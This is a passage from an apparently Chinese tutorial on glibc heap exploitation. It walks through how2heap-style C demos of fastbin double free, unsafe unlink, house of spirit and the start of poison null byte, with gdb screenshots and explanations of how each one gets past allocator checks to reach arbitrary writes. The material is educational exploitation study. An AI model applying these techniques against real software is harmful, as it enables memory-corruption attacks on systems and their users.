    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">&quot;申请两个 fastbin 范围内的 chunk: p1=%p p2=%p\n&quot;</span><span class="token punctuation">,</span> p1<span class="token punctuation">,</span> p2<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">&quot;先 free p1\n&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">free</span><span class="token punctuation">(</span>p1<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">void</span><span class="token operator">*</span> p3 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x400</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">&quot;去申请 largebin 大小的 chunk，触发 malloc_consolidate(): p3=%p\n&quot;</span><span class="token punctuation">,</span> p3<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">&quot;因为 malloc_consolidate(), p1 会被放到 unsorted bin 中\n&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">free</span><span class="token punctuation">(</span>p1<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">&quot;这时候 p1 不在 fastbin 链表的头部了，所以可以再次 free p1 造成 double free\n&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">void</span><span class="token operator">*</span> p4 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">strcpy</span><span class="token punctuation">(</span>p4<span class="token punctuation">,</span> <span class="token string">&quot;CCCCCCC&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">void</span><span class="token operator">*</span> p5 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">strcpy</span><span class="token punctuation">(</span>p5<span class="token punctuation">,</span> <span class="token string">&quot;DDDDDDDD&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">&quot;现在 fastbin 和 unsortedbin 中都放着 p1 的指针，所以我们可以 malloc 两次都到 p1: %p %p\n&quot;</span><span class="token punctuation">,</span> p4<span class="token punctuation">,</span> p5<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br></div></div><p>​    运行结果。</p> <p><img src="/images/heap/image-20211226160121021.png" alt="image-20211226160121021"></p> <p>​    首先分配两个fastbin范围内的chunk。</p> <p><img src="/images/heap/image-20211226160125949.png" alt="image-20211226160125949"></p> <p>​    释放掉p1，则空闲的chunk进入fastbin</p> <p><img src="/images/heap/image-20211226160131326.png" alt="image-20211226160131326"></p> <p>​    此时如果我们再次释放 p1，必然触发 double free 异常，然而，如果此时分配一个 large chunk，效果如下：</p> <p><img src="/images/heap/image-20211226160140067.png" alt="image-20211226160140067"></p> <p>可以看到 fastbins 中的 chunk 已经不见了，反而出现在了 small bins 中，并且 chunk p2 的 prev_size 和 size 字段都被修改。</p> <p>​    看一下large chunk的分配过程：</p> <div class="language-c line-numbers-mode"><pre class="language-c"><code><span class="token comment">/*
     If this is a large request, consolidate fastbins before continuing.
     While it might look excessive to kill all fastbins before
     even seeing if there is space available, this avoids
     fragmentation problems normally associated with fastbins.
     Also, in practice, programs tend to have runs of either small or
     large requests, but less often mixtures, so consolidation is not
     invoked all that often in most programs. And the programs that
     it is called frequently in otherwise tend to fragment.
   */</span>
<span class="token keyword">else</span>
<span class="token punctuation">{</span>
      idx <span class="token operator">=</span> <span class="token function">largebin_index</span> <span class="token punctuation">(</span>nb<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">have_fastchunks</span> <span class="token punctuation">(</span>av<span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token function">malloc_consolidate</span> <span class="token punctuation">(</span>av<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br></div></div><p>在分配large chunk的时候，首先会根据chunk的大小来获取对应的 large bin的index，然后判断fast bins中有没有chunk，如果有就调用 malloc_consolidate()合并fast bins中的chunk，然后放到unsorted bin 中。unsorted bin中的chunk 会按照大小放到small或large bins中</p> <p>p1已经不再fastbin的顶部，所以可以再次free。那么p1再次被free之后既在small bins又在fast bins。</p> <p><img src="/images/heap/image-20211226160221154.png" alt="image-20211226160221154"></p> <p>再一次 malloc 之后会从 fast bins 中分配</p> <p>void *p4 = malloc(0x10);</p> <p>strcpy(p4, &quot;CCCCCCC&quot;);</p> <p>​    可以看到堆块被写入了CCCCCCC。</p> <p><img src="/images/heap/image-20211226160227519.png" alt="image-20211226160227519"></p> <p>再一次就是从 small bins 中分配</p> <p>void *p5 = malloc(0x10);</p> <p>strcpy(p5, &quot;DDDDDDDD&quot;);</p> <p><img src="/images/heap/image-20211226160239815.png" alt="image-20211226160239815"></p> <p>​    可以看到堆块的内容被覆盖成DDDDDDDD了，这是因为p4和p5被分配在了同一个地方，修改p5处的内容其实就是修改p4处的内容。</p> <h2 id="unsafe-unlink">unsafe_unlink <a href="#unsafe-unlink" class="header-anchor">#</a></h2> <div class="language- extra-class"><pre><code>   ```c
   #include &lt;stdio.h&gt;
   #include &lt;stdlib.h&gt;
   #include &lt;string.h&gt;
   #include &lt;stdint.h&gt;
   
   uint64_t *chunk0_ptr;
   
   int main()
   {
       fprintf(stderr, &quot;当您在已知位置有指向某个区域的指针时，可以调用 unlink\n&quot;);
       fprintf(stderr, &quot;最常见的情况是易受攻击的缓冲区，可能会溢出并具有全局指针\n&quot;);
   
       int malloc_size = 0x80; //要足够大来避免进入 fastbin
       int header_size = 2;
   
       fprintf(stderr, &quot;本练习的重点是使用 free 破坏全局 chunk0_ptr 来实现任意内存写入\n\n&quot;);
   
       chunk0_ptr = (uint64_t*) malloc(malloc_size); //chunk0
       uint64_t *chunk1_ptr  = (uint64_t*) malloc(malloc_size); //chunk1
       fprintf(stderr, &quot;全局变量 chunk0_ptr 在 %p, 指向 %p\n&quot;, &amp;chunk0_ptr, chunk0_ptr);
       fprintf(stderr, &quot;我们想要破坏的 chunk 在 %p\n&quot;, chunk1_ptr);
   
       fprintf(stderr, &quot;在 chunk0 那里伪造一个 chunk\n&quot;);
       fprintf(stderr, &quot;我们设置 fake chunk 的 'next_free_chunk' (也就是 fd) 指向 &amp;chunk0_ptr 使得 P-&gt;fd-&gt;bk = P.\n&quot;);
       chunk0_ptr[2] = (uint64_t) &amp;chunk0_ptr-(sizeof(uint64_t)*3);
       fprintf(stderr, &quot;我们设置 fake chunk 的 'previous_free_chunk' (也就是 bk) 指向 &amp;chunk0_ptr 使得 P-&gt;bk-&gt;fd = P.\n&quot;);
       fprintf(stderr, &quot;通过上面的设置可以绕过检查: (P-&gt;fd-&gt;bk != P || P-&gt;bk-&gt;fd != P) == False\n&quot;);
       chunk0_ptr[3] = (uint64_t) &amp;chunk0_ptr-(sizeof(uint64_t)*2);
       fprintf(stderr, &quot;Fake chunk 的 fd: %p\n&quot;,(void*) chunk0_ptr[2]);
       fprintf(stderr, &quot;Fake chunk 的 bk: %p\n\n&quot;,(void*) chunk0_ptr[3]);
   
       fprintf(stderr, &quot;现在假设 chunk0 中存在一个溢出漏洞，可以更改 chunk1 的数据\n&quot;);
       uint64_t *chunk1_hdr = chunk1_ptr - header_size;
       fprintf(stderr, &quot;通过修改 chunk1 中 prev_size 的大小使得 chunk1 在 free 的时候误以为 前面的 free chunk 是从我们伪造的 free chunk 开始的\n&quot;);
       chunk1_hdr[0] = malloc_size;
       fprintf(stderr, &quot;如果正常的 free chunk0 的话 chunk1 的 prev_size 应该是 0x90 但现在被改成了 %p\n&quot;,(void*)chunk1_hdr[0]);
       fprintf(stderr, &quot;接下来通过把 chunk1 的 prev_inuse 改成 0 来把伪造的堆块标记为空闲的堆块\n\n&quot;);
       chunk1_hdr[1] &amp;= ~1;
   
       fprintf(stderr, &quot;现在释放掉 chunk1，会触发 unlink，合并两个 free chunk\n&quot;);
       free(chunk1_ptr);
   
       fprintf(stderr, &quot;此时，我们可以用 chunk0_ptr 覆盖自身以指向任意位置\n&quot;);
       char victim_string[8];
       strcpy(victim_string,&quot;Hello!~&quot;);
       chunk0_ptr[3] = (uint64_t) victim_string;
   
       fprintf(stderr, &quot;chunk0_ptr 现在指向我们想要的位置，我们用它来覆盖我们的 victim string。\n&quot;);
       fprintf(stderr, &quot;之前的值是: %s\n&quot;,victim_string);
       chunk0_ptr[0] = 0x4141414142424242LL;
       fprintf(stderr, &quot;新的值是: %s\n&quot;,victim_string);
   }
   ```
</code></pre></div><p>​    这个程序展示了怎样利用 free 改写全局指针 chunk0_ptr 达到任意内存写的目的，即unsafe unlink。</p> <p>​    运行一下看看</p> <p><img src="/images/heap/image-20211226160617741.png" alt="image-20211226160617741"></p> <p>​    unlink有一个保护检查机制，在解链操作之前，针对堆块P自身的fd和bk 检查了链表的完整性，即判断堆块P的前一块fd的指针是否指向P，以及后一块bk的指针是否指向 P。</p> <p>​    malloc_size设置为0x80，可以分配small chunk，然后定义header_size为2。申请两块空间，全局指针chunk0_ptr指向chunk0，局部指针chunk1_ptr 指向 chunk1。先在main函数上设置一个断点，然后单步走下一步，走到20行。</p> <p>​    我们来看一下，申请了两个堆之后的情况。</p> <p><img src="/images/heap/image-20211226160623260.png" alt="image-20211226160623260"></p> <p><img src="/images/heap/image-20211226160627911.png" alt="image-20211226160627911"></p> <p>接下来要绕过 (P-&gt;fd-&gt;bk != P || P-&gt;bk-&gt;fd != P) == False的检查，这个检查有个缺陷，就是fd/bk指针都是通过与chunk头部的相对地址来查找的，所以我们可以利用全局指针chunk0_ptr构造fake chunk来绕过它。</p> <p>再单步走到40行。</p> <p><img src="/images/heap/image-20211226160633284.png" alt="image-20211226160633284"></p> <p>​    可以看到，我们在chunk0里构造一个fake chunk，用P表示，两个指针fd 和bk可以构成两条链：P-&gt;fd-&gt;bk == P，P-&gt;bk-&gt;fd == P，可以绕过检查。另外利用chunk0的溢出漏洞，通过修改chunk 1的 prev_size为fake chunk的大小，修改 PREV_INUSE标志位为0，将fake chunk伪造成一个free chunk。</p> <p><img src="/images/heap/image-20211226160638657.png" alt="image-20211226160638657"></p> <p>​    我们的fake chunk的fd指向0x602058，然后0x602058的bk指向0x602070。fake chunk的bk指向0x602060，然后0x602060的fd指向 0x602070，可以保证前后都指向我们伪造的这个 chunk，完美！</p> <p>​    接下来释放掉chunk1，因为fake chunk和chunk1是相邻的一个free chunk，所以会将他两个合并，这就需要对fake chunk进行unlink，进行如下操作：</p> <div class="language-c line-numbers-mode"><pre class="language-c"><code>FD <span class="token operator">=</span> P<span class="token operator">-&gt;</span>fd
BK <span class="token operator">=</span> P<span class="token operator">-&gt;</span>bk
FD<span class="token operator">-&gt;</span>bk <span class="token operator">=</span> BK
BK<span class="token operator">-&gt;</span>fd <span class="token operator">=</span> FD
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><p>​    根据 fd 和 bk 指针在 malloc_chunk 结构体中的位置，这段代码等价于：</p> <div class="language-c line-numbers-mode"><pre class="language-c"><code>FD <span class="token operator">=</span> P<span class="token operator">-&gt;</span>fd <span class="token operator">=</span> <span class="token operator">&amp;</span>P <span class="token operator">-</span> <span class="token number">24</span>
BK <span class="token operator">=</span> P<span class="token operator">-&gt;</span>bk <span class="token operator">=</span> <span class="token operator">&amp;</span>P <span class="token operator">-</span> <span class="token number">16</span>
FD<span class="token operator">-&gt;</span>bk <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>P <span class="token operator">-</span> <span class="token number">24</span> <span class="token operator">+</span> <span class="token number">24</span><span class="token punctuation">)</span> <span class="token operator">=</span> P
FD<span class="token operator">-&gt;</span>fd <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>P <span class="token operator">-</span> <span class="token number">16</span> <span class="token operator">+</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">=</span> P
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><p>这样就通过了 unlink 的检查，最终效果为：</p> <div class="language-c line-numbers-mode"><pre class="language-c"><code>FD<span class="token operator">-&gt;</span>bk <span class="token operator">=</span> P <span class="token operator">=</span> BK <span class="token operator">=</span> <span class="token operator">&amp;</span>P <span class="token operator">-</span> <span class="token number">16</span>
BK<span class="token operator">-&gt;</span>fd <span class="token operator">=</span> P <span class="token operator">=</span> FD <span class="token operator">=</span> <span class="token operator">&amp;</span>P <span class="token operator">-</span> <span class="token number">24</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>​    也就是说，chunk0_ptr 和 chunk0_ptr[3] 现在指向的是同一个地址</p> <p><img src="/images/heap/image-20211226160743336.png" alt="image-20211226160743336"></p> <p>在这个图示中最终实现的效果是ptr中存的是ptr-0x18，如果本来ptr 是存的一个指针的，现在它指向了ptr-0x18。如果编辑这里的内容就可以往ptr-0x18那里去写，实现了覆盖这个指针为任意值的效果。</p> <h2 id="house-of-spirit">house_of_spirit <a href="#house-of-spirit" class="header-anchor">#</a></h2> <p>house_of_spirit是一种fastbins攻击方法，通过构造fake chunk，然后将其free掉，就可以在下一次malloc时返回fake chunk的地址，即任意我们可控的区域。House_of_spirit是一种通过堆的fast bin机制来辅助栈溢出的方法，一般的栈溢出漏洞的利用都希望能够覆盖函数的返回地址以控制EIP来劫持控制流，但如果栈溢出的长度无法覆盖返回地址，同时却可以覆盖栈上的一个即将被free的堆指针，此时可以将这个指针改写为栈上的地址并在相应位置构造一个fast bin块的元数据，接着在free操作时，这个栈上的堆块被放到fast bin中，下一次malloc对应的大小时，由于fast bin的先进后出机制，这个栈上的堆块被返回给用户，再次写入时就可能造成返回地址的改写。所以利用的第一步不是去控制一个 chunk，而是控制传给 free 函数的指针，将其指向一个fake chunk。所以 fake chunk的伪造是关键。</p> <p>源码如下。</p> <div class="language-c line-numbers-mode"><pre class="language-c"><code><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h&gt;</span></span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">&quot;这个例子演示了 house of spirit 攻击\n&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">&quot;我们将构造一个 fake chunk 然后释放掉它，这样再次申请的时候就会申请到它\n&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">&quot;覆盖一个指向 fastbin 的指针\n&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span> <span class="token operator">*</span>a<span class="token punctuation">,</span> <span class="token operator">*</span>b<span class="token punctuation">;</span>
    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span> fake_chunks<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token keyword">__attribute__</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">aligned</span> <span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">&quot;这块区域 (长度为: %lu) 包含两个 chunk. 第一个在 %p 第二个在 %p.\n&quot;</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>fake_chunks<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>fake_chunks<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>fake_chunks<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">&quot;构造 fake chunk 的 size，要比 chunk 大 0x10（因为 chunk 头），同时还要保证属于 fastbin，对于 fastbin 来说 prev_inuse 不会改变，但是其他两个位需要注意都要位 0\n&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    fake_chunks<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x40</span><span class="token punctuation">;</span> <span class="token comment">// size</span>

    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">&quot;next chunk 的大小也要注意，要大于 0x10 小于 av-&gt;system_mem（128kb）\n&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">// 这是fake_chunks[?]可以数一下</span>
    fake_chunks<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x1234</span><span class="token punctuation">;</span> <span class="token comment">// nextsize</span>
    fake_chunks<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x4141414141414141LL</span><span class="token punctuation">;</span>
    fake_chunks<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x4141414141414141LL</span><span class="token punctuation">;</span>

    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">&quot;现在，我们拿伪造的那个 fake chunk 的地址进行 free, %p.\n&quot;</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>fake_chunks<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    a <span class="token operator">=</span> <span class="token operator">&amp;</span>fake_chunks<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">&quot;free!\n&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">free</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">&quot;现在 malloc 的时候将会把 %p 给返回回来\n&quot;</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>fake_chunks<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    b <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">&quot;malloc(0x30): %p\n&quot;</span><span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">;</span>
    b<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x4242424242424242LL</span><span class="token punctuation">;</span>
    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">&quot;ok!\n&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br></div></div><div class="language- extra-class"><pre><code>```c
gcc -g house_of_spirit.c -o house_of_spirit
```
</code></pre></div><p>​    首先在程序的第 14 行下个断点</p> <p>运行到这里可以看到 fake_chunk 目前还没有被我们写入。</p> <p><img src="/images/heap/image-20211226160826730.png" alt="image-20211226160826730"></p> <p>我们直接让他写完，再来看一下，已经构造出fake chunk了。</p> <p><img src="/images/heap/image-20211226160833206.png" alt="image-20211226160833206"></p> <p>对fake chunk进行free之后。</p> <p><img src="/images/heap/image-20211226160839557.png" alt="image-20211226160839557"></p> <p>可以看一下fastbin，现在已经有了我们构造的哪个fake chunk了。</p> <p><img src="/images/heap/image-20211226160844417.png" alt="image-20211226160844417"></p> <p>接下来再次malloc一个相同大小的chunk就会把fastbin中的fake chunk申请过去。</p> <div class="language-c line-numbers-mode"><pre class="language-c"><code>b <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
b<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x4242424242424242LL</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p><img src="/images/heap/image-20211226160849714.png" alt="image-20211226160849714"></p> <p>伪造chunk时需要绕过一些检查，首先是标志位，<code>PREV_INUSE</code> 位并不影响 free的过程，但 <code>IS_MMAPPED</code> 位和 <code>NON_MAIN_ARENA</code> 位都要为零。其次，在64位系统中fast chunk的大小要在 32~128 字节之间。最后，是next chunk的大小，必须大于 <code>2*SIZE_SZ</code>（即大于16），小于 <code>av-&gt;system_mem</code>（即小于128kb），才能绕过对next chunk大小的检查。</p> <p>​    所以house_of_spirit的主要目的是，当我们伪造的fake chunk内部存在不可控区域时，运用这一技术可以将这片区域变成可控的。上面为了方便观察，在 fake chunk里填充一些字母，但在现实中这些位置很可能是不可控的，而house_of_spirit也正是以此为目的而出现的。</p> <h2 id="poison-null-byte">poison_null_byte <a href="#poison-null-byte" class="header-anchor">#</a></h2> <p>​    源码如下。</p> <div class="language-c line-numbers-mode"><pre class="language-c"><code><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h&gt;</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h&gt;</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdint.h&gt;</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;malloc.h&gt;</span></span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">&quot;当存在 off by null 的时候可以使用该技术\n&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    uint8_t<span class="token operator">*</span> a<span class="token punctuation">;</span>
    uint8_t<span class="token operator">*</span> b<span class="token punctuation">;</span>
    uint8_t<span class="token operator">*</span> c<span class="token punctuation">;</span>
    uint8_t<span class="token operator">*</span> b1<span class="token punctuation">;</span>
    uint8_t<span class="token operator">*</span> b2<span class="token punctuation">;</span>
    uint8_t<span class="token operator">*</span> d<span class="token punctuation">;</span>
    <span class="token keyword">void</span> <span class="token operator">*</span>barrier<span class="token punctuation">;</span>

    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">&quot;申请 0x100 的 chunk a\n&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    a <span class="token operator">=</span> <span class="token punctuation">(</span>uint8_t<span class="token operator">*</span><span class="token punctuation">)</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">&quot;a 在: %p\n&quot;</span><span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">int</span> real_a_size <span class="token operator">=</span> <span class="token function">malloc_usable_size</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">&quot;因为我们想要溢出 chunk a，所以需要知道他的实际大小: %#x\n&quot;</span><span class="token punctuation">,</span> real_a_size<span class="token punctuation">)</span><span class="token punctuation">;</span>

    b <span class="token operator">=</span> <span class="token punctuation">(</span>uint8_t<span class="token operator">*</span><span class="token punctuation">)</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x200</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">&quot;b: %p\n&quot;</span><span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">;</span>
    c <span class="token operator">=</span> <span class="token punctuation">(</span>uint8_t<span class="token operator">*</span><span class="token punctuation">)</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">&quot;c: %p\n&quot;</span><span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token punctuation">;</span>

    barrier <span class="token operator">=</span>  <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">&quot;另外再申请了一个 chunk c：%p，防止 free 的时候与 top chunk 发生合并的情况\n&quot;</span><span class="token punctuation">,</span> barrier<span class="token punctuation">)</span><span class="token punctuation">;</span>

